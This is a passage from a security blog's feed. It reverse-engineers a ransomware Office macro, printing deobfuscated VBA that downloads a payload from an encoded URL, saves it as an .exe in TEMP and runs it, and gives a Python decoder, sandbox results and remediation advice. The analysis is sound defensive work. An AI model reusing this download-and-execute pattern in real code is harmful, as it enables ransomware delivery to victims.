&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;responseBody&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;savetofile&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zorgins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The last one is really informative since it is the name of an “.exe” file, which is probably the real payload. This means that there should be a part where the file “zorgins.exe” is downloaded and saved to the system.&lt;br /&gt;
We can then substitute these values everytime they appear in the code so as to decrypt it (look at the comments):&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Adodb.streaM)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(shell.Application)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh1DASH1solo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh1DASH1solo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Open&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(shell.Application).Open (CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It is clear now that “zorgins.exe” is saved in TEMP directory; moreover in the following snippet we have the HTTP GET request for a url (malware download) which is marked as “InTheAfrikaMountainsAreHigh4”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Open&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).Open GeT, InTheAfrikaMountainsAreHigh4, False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).Send&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responseBody&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).responseBody&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Adodb.streaM).Write CreateObject(Microsoft.XMLHTTP).responseBody&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Moving through the code, there is an strange series of numbers separated by the string “112112112112” and saved in the array “InTheAfrikaMountainsAreHighXSAOO”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quotquot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;112112112112&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Taking a look at where this variable is used, we find this interesting function:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DuBirMahnWeishr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh6&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Dost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;DuBirMahnWeishr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which is then used here:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LBound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;To&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UBound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DuBirMahnWeishr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;Next&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It performs a computation by dividing each value of the array “InTheAfrikaMountainsAreHighXSAOO” by 61, converting the value to the corrensponding character using function &lt;em&gt;Chr()&lt;/em&gt; and saving the results in “InTheAfrikaMountainsAreHigh4”, that is the variable seen before representing malware download url.&lt;br /&gt;
Converting the first values we get:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# python
&amp;gt;&amp;gt;&amp;gt; chr(6344/61)
&#39;h&#39;
&amp;gt;&amp;gt;&amp;gt; chr(7076/61)
&#39;t&#39;
&amp;gt;&amp;gt;&amp;gt; chr(6832/61)
&#39;p&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This looked promising, so I have written a simple Python script named “decrypt.py” that performs the conversion:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3538&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6649&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5917&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2745&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6588&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2928&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3477&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7137&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3416&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7381&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;Malware download address: &#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After running the script we get the decrypted value:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/macro_malware/decrypt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I thought, that string was hiding the address used by the macro to download the real payload which is then saved in the temporary directory as “zorgins.exe”; once it executes, it starts encrypting files on the machine.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sandbox dynamic analysis&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As a confirmation of what we have found, we can upload the file on the following website: &lt;a href=&quot;https://www.hybrid-analysis.com/&quot;&gt;https://www.hybrid-analysis.com/&lt;/a&gt;.&lt;br /&gt;
Hybrid Analysis is powered by Payload Security and offers a free service which performs both static and dynamic (behavioral) analysis by interacting with VirusTotal (a free virus, malware and URL online scanning service which uses more than 40 antivirus solutions to execute static analysis), Metadefender (similar to VirusTotal) and running samples in VxStream Sandbox.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/vxstream_sandbox.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/vxstream_sandbox.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once the analysis is complete it reports results back to the user, showing also screenshots saved during the execution:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution1.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution2.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As the previous image reports, after the damage has been done, the malware shows the instructions to follow to acquire the decryption key. This can be done by navigating to a website which resides in the Tor network (accessible only by installing Tor software). Once the victim gets there, the attacker requests payment in Bitcoins (a particular currency which is not trackable) and after the money transfer has been done the victim &lt;em&gt;should&lt;/em&gt; receive the key to restore documents back to their original state.&lt;/p&gt;

&lt;p&gt;Analyzing the report we can verify that informations found during the reverse engineering activity coincide with the results returned after sandbox execution.&lt;/p&gt;

&lt;p&gt;Usage of function &lt;em&gt;AutoOpen()&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/macro_malware/autoopen.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/autoopen.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Name of dropped malware and download url including spawned processes:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/data_verification.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/data_verification.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/hybrid_analysis.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/hybrid_analysis.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Going deeper&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The analysis performed gives us even more informations such as malicious hosts related to malware download IP address:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This helps us making further analysis: the service reports that even other websites associated to that IP address are flagged as malicious; in fact, from those addresses it is pretty clear the attacker has compromised legitimate sites and he is now using them to host malware and to carry on phishing activities (look for example at Paypal reference on the last url).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Once we know the malware download address we can block it by putting the IP address of the website in Firewall/IPS blacklist. A more drastic solution is to create a new rule on the mail server/Antispam blocking all attachments with extension “.docm”.&lt;/p&gt;

&lt;p&gt;Anyway for this type of attacks the best defence is awareness: informing users of possible scams like this one is the best countermeasure you can ever implement.&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</guid>
        
        <category>Malware</category>
        
        <category>Ransomware</category>
        
        <category>Office macro</category>
        
        <category>Reverse engineering</category>
        
        <category>Decryption</category>
        
        <category>Sandbox</category>
        
        <category>Dynamic analysis</category>
        
        
      </item>
    
      <item>
        <title>Open Source Web Reconnaissance with Recon-ng</title>
        <description>&lt;p&gt;During a penetration test, a big part of the success in the exploitation phase depends from how good the information gathering was performed. Since this activity, especially when dealing with a huge amount of informations, is time consuming, it is a good idea to rely on tools which make reconnaissance in automated way.&lt;/p&gt;

